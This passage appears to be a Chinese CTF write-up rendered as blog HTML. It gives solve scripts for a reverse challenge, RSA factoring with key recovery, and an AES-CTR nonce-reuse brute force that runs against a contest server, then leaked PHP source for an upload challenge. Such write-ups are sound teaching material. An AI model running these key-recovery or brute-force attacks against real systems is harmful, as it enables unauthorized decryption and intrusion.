class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import re</span></span><br><span class="line"><span class="comment"># a = ''' 17153 * a1[27]</span></span><br><span class="line"><span class="comment"># + 41549 * a1[26]</span></span><br><span class="line"><span class="comment"># + 28202 * a1[24]</span></span><br><span class="line"><span class="comment"># + 36806 * a1[23]</span></span><br><span class="line"><span class="comment"># + 12690 * a1[22]</span></span><br><span class="line"><span class="comment"># + 42821 * a1[20]</span></span><br><span class="line"><span class="comment"># + 39834 * a1[19]</span></span><br><span class="line"><span class="comment"># + 17994 * a1[17]</span></span><br><span class="line"><span class="comment"># + 32765 * a1[14]</span></span><br><span class="line"><span class="comment"># + 25687 * a1[10]</span></span><br><span class="line"><span class="comment"># + 33388 * a1[9]</span></span><br><span class="line"><span class="comment"># + 143 * a1[4]</span></span><br><span class="line"><span class="comment"># + 63776 * a1[0]</span></span><br><span class="line"><span class="comment"># + 8682 * a1[1]</span></span><br><span class="line"><span class="comment"># - 16324 * a1[2]</span></span><br><span class="line"><span class="comment"># - 20022 * a1[3]</span></span><br><span class="line"><span class="comment"># - 48973 * a1[5]</span></span><br><span class="line"><span class="comment"># - 57775 * a1[6]</span></span><br><span class="line"><span class="comment"># - 43820 * a1[7]</span></span><br><span class="line"><span class="comment"># - 41070 * a1[8]</span></span><br><span class="line"><span class="comment"># - 15669 * a1[11]</span></span><br><span class="line"><span class="comment"># - 6946 * a1[12]</span></span><br><span class="line"><span class="comment"># - 23187 * a1[13]</span></span><br><span class="line"><span class="comment"># - 46495 * a1[15]</span></span><br><span class="line"><span class="comment"># - 8395 * a1[16]</span></span><br><span class="line"><span class="comment"># - 27782 * a1[18]</span></span><br><span class="line"><span class="comment"># - 46043 * a1[21]</span></span><br><span class="line"><span class="comment"># - 15428 * a1[25]</span></span><br><span class="line"><span class="comment"># - 59010 * a1[28]</span></span><br><span class="line"><span class="comment"># - 49235 * a1[29]</span></span><br><span class="line"><span class="comment"># - 53666 * a1[30]</span></span><br><span class="line"><span class="comment"># + 28539 * a1[31] == -15479857 '''</span></span><br><span class="line"><span class="comment"># a = a.replace("a1","").split("\n")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># matrix = [0 for i in range(32)]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(32):</span></span><br><span class="line">	<span class="comment"># f = re.search("([+-]?) ([0-9]*)",a[i]).groups()[0]</span></span><br><span class="line">	<span class="comment"># value = int(re.search("([+-]?) ([0-9]*)",a[i]).groups()[1])</span></span><br><span class="line">	<span class="comment"># if f != '':</span></span><br><span class="line">		<span class="comment"># if f == '-':</span></span><br><span class="line">			<span class="comment"># value = -1*value</span></span><br><span class="line">		<span class="comment"># else:</span></span><br><span class="line">			<span class="comment"># pass</span></span><br><span class="line">	<span class="comment"># idx = int(a[i][a[i].find('[')+1:a[i].find(']')])</span></span><br><span class="line">	<span class="comment"># matrix[idx] = value</span></span><br><span class="line"><span class="comment"># m = ''</span></span><br><span class="line"><span class="comment"># for i in matrix:</span></span><br><span class="line">	<span class="comment"># m += str(i)+','</span></span><br><span class="line"><span class="comment"># m = m.strip(',')</span></span><br><span class="line"><span class="comment"># print m</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># http://www.yunsuan.info/matrixcomputations/solvelinearsystems.html</span></span><br><span class="line"><span class="comment"># 44493,-326,-57451,-18424,22432,45266,20069,47551,-3751,39591,35081,45204,-6984,-9410,-54261,2139,48734,-62111,44970,29470,-20305,-33120,39390,1513,58180,-11160,-24198,37157,50244,-1646,37027,-13318</span></span><br><span class="line"><span class="comment"># -54741,-3606,48560,-45416,22008,11900,-24275,-64371,32499,46114,-25714,21730,-56673,9624,28702,-39430,9187,-35779,26720,-15144,51548,11260,48594,-45050,-59016,50109,-29262,-55650,-29492,-13828,12535,40522</span></span><br><span class="line"><span class="comment"># 17703,-16114,-24359,54532,15266,5819,-33999,19362,-58904,63538,64858,2665,-11844,-29623,20144,43681,32755,-42532,-60912,20331,3541,53780,29817,-4711,-56853,57822,31675,52683,57988,-33486,12097,24590</span></span><br><span class="line"><span class="comment"># 24247,64898,-24733,3430,41149,17219,-16545,42702,-1315,24960,27013,28,2783,-15867,-12126,28232,-3823,37522,48151,-20727,-12037,-9347,-39338,-50524,-38675,-26114,-4975,59561,32393,36741,51792,-24297</span></span><br><span class="line"><span class="comment"># -32261,-54551,15294,-61664,-40648,-12277,-55300,-63212,41251,-45548,-22362,-32993,64221,-43046,-40770,5380,57738,62825,52035,3079,-7119,26782,-36194,-56102,-19468,54655,35562,-59856,25143,13289,64702,23822</span></span><br><span class="line"><span class="comment"># -9407,64048,60965,33702,-12654,-56126,-47366,47843,30627,-29056,32583,-50822,-6240,43847,47577,-12371,8314,22558,9886,43924,-23282,-13137,-13716,6461,63681,-43391,-37217,-43714,-55909,-62806,5977,36688</span></span><br><span class="line"><span class="comment"># -23136,47281,20301,-61441,2565,57144,44459,-31365,16024,54218,-56894,-52977,-39404,-63477,63390,-22773,46343,-50258,40389,-25970,23917,-56685,47030,5856,-55893,36904,44955,58093,13407,49426,26401,-25199</span></span><br><span class="line"><span class="comment"># 62577,23069,18654,4696,22400,-16178,42663,-34941,-50803,-28229,15341,3911,-45565,50053,-45774,18373,7881,-28140,1742,-29986,58351,14952,-40067,15201,11269,53436,41681,22198,-63863,-50393,-14615,16722</span></span><br><span class="line"><span class="comment"># -39728,57392,910,37963,-2274,-61995,-43938,-12412,-10642,-10303,31888,7362,-16356,-615,40135,-11314,-17185,54431,-61134,-4620,-4591,29560,35119,-51958,40581,34037,-65066,5750,-6232,-60002,17326,30503</span></span><br><span class="line"><span class="comment"># -16296,-8786,48180,-65236,-48383,-32713,61315,-58771,-47593,-14512,6483,56260,25366,58190,-60203,27537,50686,-7295,-3885,61335,-39212,-40687,-19258,-57463,32582,2313,-24504,-11629,-8917,31106,-4535,38212</span></span><br><span class="line"><span class="comment"># -31610,52623,-35005,25689,-9320,63683,39253,51102,-16508,11413,3265,35320,18706,6847,-55110,528,35247,-63180,30153,-13666,39538,-49046,33264,51928,13203,17103,59096,48721,33683,-42949,-60950,26096</span></span><br><span class="line"><span class="comment"># 47557,52902,-12806,-59773,-9182,-57417,-18447,6146,15859,59808,30791,-54963,45466,-61599,49637,21116,15786,3656,-18454,28722,46709,21307,50390,5176,-30277,-25544,-17882,-25149,61328,-17363,49588,21848</span></span><br><span class="line"><span class="comment"># 37688,23309,-2616,59129,5104,-12561,-3215,60503,29438,42505,-49703,38339,12457,45365,-15471,33925,-23447,-50859,-86,54770,36604,-3773,-9573,-25835,42417,4680,-20107,58284,-45915,-56171,18191,29164</span></span><br><span class="line"><span class="comment"># 20452,18062,-56424,56918,-10457,50206,-12288,-54591,-44777,24700,12962,38458,-52078,19385,18867,-9805,-48011,-27363,-20890,13714,-788,50998,29867,-7954,-34056,16127,5149,49705,-34732,-54092,64657,35416</span></span><br><span class="line"><span class="comment"># -39611,25246,1951,-37145,-3824,21330,-49145,-43603,8191,-60671,-53032,-48392,-15417,40645,-13059,-58653,42329,-51631,-50173,18903,52431,-44904,37330,40656,-34380,24333,41644,-18100,-57765,-64534,44968,-26760</span></span><br><span class="line"><span class="comment"># -39824,44401,45166,53538,-2540,43929,-54452,-11199,-19801,23926,-13592,47959,19579,-29922,30392,15405,61374,17545,39526,7046,-34144,57593,-5305,-46917,44211,-4511,-23881,29438,-39081,34688,28579,3296</span></span><br><span class="line"><span class="comment"># 62215,19566,15203,-30340,-15964,59815,-13939,60087,-43008,-44925,-49239,-40498,-54453,-33557,6928,24510,36587,-24721,7959,49381,-21456,-40311,8487,-61111,-18918,-33393,-9301,41415,-61619,64380,40454,58498</span></span><br><span class="line"><span class="comment"># 35423,-12994,33894,40977,57560,63291,-32256,-23534,40291,5725,-40660,43131,-19119,21483,39085,62097,-33732,-63756,35027,3633,30380,36333,-13528,53612,6578,-47605,10809,-43202,14305,2766,-42819,-34232</span></span><br><span class="line"><span class="comment"># 44942,63420,58838,55103,27162,53130,27559,26302,-24313,-42499,-21629,34155,-2633,-55014,-22926,19761,-305,-63708,13647,31419,62674,-32334,-47684,-54226,-50848,10136,26215,44427,27903,48054,-15102,-22362</span></span><br><span class="line"><span class="comment"># 6300,-30549,9153,26426,46559,-55683,62261,-44433,6137,-46194,-57198,33875,-45266,51231,65438,45781,-6605,-43397,-7672,-48485,-54035,-12567,-47051,-62256,13058,55552,4221,61587,23936,-9828,59525,50225</span></span><br><span class="line"><span class="comment"># -28415,36297,5686,59059,14796,-11307,-57251,-29507,-41415,12090,62270,8353,-24476,-41751,-46589,63967,55058,10481,30422,47722,-55870,-6321,53136,12704,42884,-34350,-32922,-64909,-50870,13236,39286,49349</span></span><br><span class="line"><span class="comment"># 15479,10453,58731,-9782,63976,-9166,5707,-21516,-2689,29174,23244,-47968,-38843,-13488,61646,3991,57764,-57649,63445,-487,6252,52361,16634,42491,-30704,54808,-61218,18612,-32873,-58677,-2280,35233</span></span><br><span class="line"><span class="comment"># 36368,-30534,50614,-7805,9520,-60795,-17511,-34692,-22139,-49013,-24672,41197,35504,28641,11252,-22264,56629,23301,-55578,-61882,-48469,28509,-8197,-43020,15688,29396,-36911,38392,58430,-6762,38132,56670</span></span><br><span class="line"><span class="comment"># 3542,-17533,28247,1791,-44455,-2748,21876,-38052,8511,61205,-16528,-4664,-13326,16494,-52661,-38860,58300,-60164,-39975,-19566,55072,-55251,-8160,-54674,58305,-29010,-6627,35318,-15962,19958,-10549,-8177</span></span><br><span class="line"><span class="comment"># -7510,-61303,25124,35004,-34033,-49161,-6021,-36125,37617,-10528,-47741,-45531,-1546,2052,-59464,29853,-22656,31346,26883,38644,26034,-24655,-9816,8621,-22299,-23745,37204,47703,13827,15394,-23945,48741</span></span><br><span class="line"><span class="comment"># 19310,1288,-38840,-49229,-40618,39102,34746,-41363,-45367,41169,-21440,-36535,33349,-43289,47866,5395,56668,-41392,30949,53570,-40337,16432,-1430,-28334,35917,-46487,61644,8511,-42458,27496,-59664,64335</span></span><br><span class="line"><span class="comment"># -18187,28981,-53485,17974,41797,-20458,-8491,-16831,33384,53494,-31995,51835,-12109,30996,42087,60427,12986,-51691,-58925,-40872,33269,3954,56824,-30202,59304,-30793,26203,13806,-42110,41403,-1100,-26194</span></span><br><span class="line"><span class="comment"># -40011,-26232,-4849,-60564,20386,44081,-50739,40590,-17237,19883,-35381,28950,-4203,19225,-50964,-39946,28859,12186,38175,-22511,-20539,15071,48156,34737,42732,-60250,-61430,-11009,47559,53536,-8879,46741</span></span><br><span class="line"><span class="comment"># -42653,43668,-10988,3756,34932,61953,22126,29632,59350,-48711,-23958,-33557,50367,41961,-17831,-4583,41615,27387,34328,-29750,9871,-49888,41239,18672,20039,56136,-30956,7689,45907,5442,-41068,23514</span></span><br><span class="line"><span class="comment"># -26968,-23313,38342,5179,10458,3678,-32333,-43275,-2423,-60827,-42621,15986,-27590,59508,53583,19553,-56307,869,6738,63177,-30359,50228,21760,-19919,24036,-18153,41909,-6931,-5822,-30949,-16572,11920</span></span><br><span class="line"><span class="comment"># 8386,57646,35980,-4029,8314,18877,4313,29760,-47059,46356,52295,35013,57567,-25490,64744,1703,55168,-62526,37870,-63227,-27315,31098,6747,63177,55323,-23370,-37329,54696,-6309,43819,-12433,8882</span></span><br><span class="line"><span class="comment"># 63776,8682,-16324,-20022,143,-48973,-57775,-43820,-41070,33388,25687,-15669,-6946,-23187,32765,-46495,-8395,17994,-27782,39834,42821,-46043,12690,36806,28202,-15428,41549,17153,-59010,-49235,-53666,28539</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 34771791</span></span><br><span class="line"><span class="comment"># -9451883</span></span><br><span class="line"><span class="comment"># 29782736</span></span><br><span class="line"><span class="comment"># 27959979</span></span><br><span class="line"><span class="comment"># -10644544</span></span><br><span class="line"><span class="comment"># 230179</span></span><br><span class="line"><span class="comment"># 15871572</span></span><br><span class="line"><span class="comment"># 12844672</span></span><br><span class="line"><span class="comment"># -7906855</span></span><br><span class="line"><span class="comment"># -5359162</span></span><br><span class="line"><span class="comment"># 34815239</span></span><br><span class="line"><span class="comment"># 23582278</span></span><br><span class="line"><span class="comment"># 30273764</span></span><br><span class="line"><span class="comment"># 7501764</span></span><br><span class="line"><span class="comment"># -35816639</span></span><br><span class="line"><span class="comment"># 30983928</span></span><br><span class="line"><span class="comment"># -4472687</span></span><br><span class="line"><span class="comment"># 18523534</span></span><br><span class="line"><span class="comment"># 20982750</span></span><br><span class="line"><span class="comment"># 5070455</span></span><br><span class="line"><span class="comment"># 3066924</span></span><br><span class="line"><span class="comment"># 26232118</span></span><br><span class="line"><span class="comment"># -860377</span></span><br><span class="line"><span class="comment"># -14482154</span></span><br><span class="line"><span class="comment"># -17062269</span></span><br><span class="line"><span class="comment"># 6695285</span></span><br><span class="line"><span class="comment"># 16909859</span></span><br><span class="line"><span class="comment"># -1622782</span></span><br><span class="line"><span class="comment"># 33025495</span></span><br><span class="line"><span class="comment"># -10454601</span></span><br><span class="line"><span class="comment"># 51177223</span></span><br><span class="line"><span class="comment"># -15479857</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = [<span class="number">99</span>,<span class="number">115</span>,<span class="number">50</span>,<span class="number">56</span>,<span class="number">82</span>,<span class="number">116</span>,<span class="number">116</span>,<span class="number">104</span>,<span class="number">72</span>,<span class="number">113</span>,<span class="number">115</span>,<span class="number">98</span>,<span class="number">117</span>,<span class="number">102</span>,<span class="number">111</span>,<span class="number">106</span>,<span class="number">115</span>,<span class="number">76</span>,<span class="number">122</span>,<span class="number">55</span>,<span class="number">121</span>,<span class="number">103</span>,<span class="number">50</span>,<span class="number">68</span>,<span class="number">89</span>,<span class="number">113</span>,<span class="number">87</span>,<span class="number">81</span>,<span class="number">69</span>,<span class="number">69</span>,<span class="number">99</span>,<span class="number">89</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> res])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+
+<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="rsa1"><a href="#rsa1" class="headerlink" title="rsa1"></a>rsa1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n=<span class="number">21173064304574950843737446409192091844410858354407853391518219828585809575546480463980354529412530785625473800210661276075473243912578032636845746866907991400822100939309254988798139819074875464612813385347487571449985243023886473371811269444618192595245380064162413031254981146354667983890607067651694310528489568882179752700069248266341927980053359911075295668342299406306747805925686573419756406095039162847475158920069325898899318222396609393685237607183668014820188522330005608037386873926432131081161531088656666402464062741934007562757339219055643198715643442608910351994872740343566582808831066736088527333762011263273533065540484105964087424030617602336598479611569611018708530024591023015267812545697478378348866840434551477126856261767535209092047810194387033643274333303926423370062572301</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">nnn1=int(str(n)[:<span class="number">200</span>])<span class="number">-1</span></span><br><span class="line">nnn2=int(str(n)[<span class="number">600</span>:])</span><br><span class="line">ab=int(str(nnn1)+str(nnn2))</span><br><span class="line"></span><br><span class="line">ab=<span class="number">2117306430457495084373744640919209184441085835440785339151821982858580957554648046398035452941253078562547380021066127607547324391257803263684574686690799140082210093930925498879813981907487546461281266736088527333762011263273533065540484105964087424030617602336598479611569611018708530024591023015267812545697478378348866840434551477126856261767535209092047810194387033643274333303926423370062572301</span></span><br><span class="line"></span><br><span class="line">a2b2=n-(pow(<span class="number">10</span>,<span class="number">400</span>)+<span class="number">1</span>)*ab <span class="comment">#a**2+b**2</span></span><br><span class="line"><span class="comment"># print a2b2</span></span><br><span class="line">t=a2b2/pow(<span class="number">10</span>,<span class="number">200</span>)</span><br><span class="line"><span class="comment"># print t </span></span><br><span class="line"></span><br><span class="line">t1=t+<span class="number">2</span>*ab <span class="comment">#(a+b)**2</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"(a+b)**2:"</span>,t1 <span class="comment">#(a+b)**2 </span></span><br><span class="line">t2=t1<span class="number">-4</span>*ab <span class="comment">#(a-b)**2</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"(a-b)**2:"</span>,t2 <span class="comment">#(a-b)**2 </span></span><br><span class="line"></span><br><span class="line">tt1=iroot(t1,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"(a+b):"</span>,tt1 <span class="comment">#(a+b)</span></span><br><span class="line">tt2=iroot(t2,<span class="number">2</span>)[<span class="number">0</span>] </span><br><span class="line"><span class="keyword">print</span> <span class="string">"(a-b):"</span>,tt2 <span class="comment">#(a-b)</span></span><br><span class="line"></span><br><span class="line">b=(tt1-tt2)/<span class="number">2</span></span><br><span class="line">a=tt1-b</span><br><span class="line"><span class="keyword">print</span> <span class="string">"b:"</span>,b</span><br><span class="line"><span class="keyword">print</span> <span class="string">"a:"</span>,a</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> iroot(t1,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> iroot(t2,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p = a*pow(<span class="number">10</span>,<span class="number">200</span>)+b</span><br><span class="line">q = b*pow(<span class="number">10</span>,<span class="number">200</span>)+a</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p*q==n</span><br><span class="line"><span class="keyword">print</span> <span class="string">"p"</span>,p</span><br><span class="line"><span class="keyword">print</span> <span class="string">"q"</span>,q</span><br><span class="line"></span><br><span class="line">phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phin)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"d"</span>,d</span><br><span class="line">c=<span class="number">16396023285324039009558195962852040868243807971027796599580351414803675753933120024077886501736987010658812435904022750269541456641256887079780585729054681025921699044139927086676479128232499416835051090240458236280851063589059069181638802191717911599940897797235038838827322737207584188123709413077535201099325099110746196702421778588988049442604655243604852727791349351291721230577933794627015369213339150586418524473465234375420448340981330049205933291705601563283196409846408465061438001010141891397738066420524119638524908958331406698679544896351376594583883601612086738834989175070317781690217164773657939589691476539613343289431727103692899002758373929815089904574190511978680084831183328681104467553713888762965976896013404518316128288520016934828176674482545660323358594211794461624622116836</span></span><br><span class="line">flag = gmpy2.powmod(c, d, n)</span><br><span class="line"><span class="keyword">print</span> hex(flag)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><p>查看加密函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(msg, key)</span>:</span></span><br><span class="line">    ctr = Counter.new(<span class="number">128</span>,  initial_value=sum(msg))</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(msg)</span><br></pre></td></tr></table></figure>
+
+<p>是使用AES的CTR模式，百度了下是把<code>counter</code>加密和明文异或下，即密文是<code>counter^msg</code>,这里的问题就是<code>ctr</code>的初始值是<code>sum(msg)</code>，如果我们输入字符串的<code>sum</code>和<code>flag</code>一样的话，那<code>counter</code>就是一样的，所以<code>flag = encflag^input^enc_input</code></p>
+<p>爆破脚本为:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_str</span><span class="params">(str1)</span>:</span></span><br><span class="line">	res = <span class="string">''</span></span><br><span class="line">	idx = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">		<span class="keyword">if</span> str1[idx] != <span class="string">'\\'</span>:</span><br><span class="line">			res += str1[idx]</span><br><span class="line">			idx += <span class="number">1</span></span><br><span class="line">		<span class="keyword">elif</span> str1[idx] == <span class="string">'\\'</span> <span class="keyword">and</span> str1[idx+<span class="number">1</span>] == <span class="string">'x'</span> <span class="keyword">and</span> str1[idx+<span class="number">2</span>] <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span> <span class="keyword">and</span> str1[idx+<span class="number">3</span>] <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">			res += chr(int(str1[idx+<span class="number">2</span>:idx+<span class="number">4</span>],<span class="number">16</span>))</span><br><span class="line">			idx += <span class="number">4</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			res += str1[idx]</span><br><span class="line">			idx += <span class="number">1</span></span><br><span class="line">	<span class="keyword">assert</span>(len(res) == <span class="number">30</span>)</span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line"><span class="comment"># p = remote("111.186.57.123",10001)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(str1)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">		<span class="keyword">if</span> ord(str1[i]) &lt; <span class="number">0x20</span> <span class="keyword">or</span> ord(str1[i]) &gt; <span class="number">0x7f</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">start = <span class="number">0x20</span>*<span class="number">30</span></span><br><span class="line">end = <span class="number">0x7f</span>*<span class="number">30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l = [<span class="number">0x20</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil("plaintext: ")</span></span><br><span class="line"><span class="keyword">while</span> sum(l) &lt; end:</span><br><span class="line">	<span class="comment"># p = process("./aes.py")</span></span><br><span class="line">	p = remote(<span class="string">"111.186.57.123"</span>,<span class="number">10001</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"flag: b"</span>)</span><br><span class="line">	enc_flag = p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>)[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">	encflag = encode_str(enc_flag)</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">		p.recvuntil(<span class="string">"plaintext: "</span>)</span><br><span class="line">		plaintext = (<span class="string">''</span>.join([chr(_) <span class="keyword">for</span> _ <span class="keyword">in</span> l]))</span><br><span class="line">		p.sendline(plaintext.encode(<span class="string">'hex'</span>))</span><br><span class="line">		<span class="comment">#inc the l</span></span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">			<span class="keyword">if</span> l[k] &lt; <span class="number">0x7f</span>:</span><br><span class="line">				l[k] += <span class="number">1</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">		</span><br><span class="line">		p.recvuntil(<span class="string">"ciphertext: b"</span>)</span><br><span class="line">		ciphertext = encode_str(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>)[<span class="number">1</span>:<span class="number">-1</span>])</span><br><span class="line">		res = long_to_bytes(bytes_to_long(ciphertext)^bytes_to_long(plaintext)^bytes_to_long(encflag))</span><br><span class="line">		<span class="keyword">if</span> check(res) == <span class="literal">True</span>:</span><br><span class="line">			success(<span class="string">"flag is : %s"</span> % res)</span><br><span class="line">			sys.exit()</span><br><span class="line">	info(str(sum(l)))</span><br><span class="line">	p.close()</span><br><span class="line">	<span class="comment"># p.kill()</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br></pre></td></tr></table></figure>
+
+<p>最终<code>sum(flag)</code>在2760到2790之间<br>flag为 <code>flag{Don&#39;t_Reu5e_n0nCe_1n_CTR}</code></p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p><code>&lt;!---/.login.php.swp--&gt;</code>拿到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($username))&#123;</span><br><span class="line">    $sql = <span class="string">"select password from user where name=?"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($stmt = $mysqli-&gt;prepare($sql)) &#123;</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($dpasswd);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> ($dpasswd === $password)&#123;</span><br><span class="line">	    $_SESSION[<span class="string">'login'</span>] = <span class="number">1</span>;</span><br><span class="line">            header(<span class="string">"Location: /upload.php"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"login failed"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $stmt-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: /index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mysqli-&gt;close();</span><br></pre></td></tr></table></figure>
+
